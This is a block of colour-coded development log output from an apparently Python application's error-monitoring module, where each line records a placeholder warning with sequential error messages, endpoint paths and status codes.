WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871421Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3418'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871470Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3419'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871520Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3420'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871571Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3421'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871620Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3422'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871669Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3423'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871718Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3424'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871767Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3425'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871816Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3426'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871865Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3427'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871914Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3428'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.871962Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3429'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872011Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3430'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872061Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3431'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872110Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3432'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872158Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3433'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872206Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3434'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872253Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3435'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872302Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3436'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872352Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3437'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872406Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3438'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872509Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3439'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872577Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3440'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872632Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3441'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872688Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3442'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872789Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3443'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872851Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3444'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872905Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3445'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.872956Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3446'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873007Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3447'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873061Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3448'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873111Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m69[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3449'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873161Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3450'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873211Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3451'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873260Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3452'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873309Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3453'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873359Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3454'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873408Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3455'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873457Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3456'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.873505Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3457'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
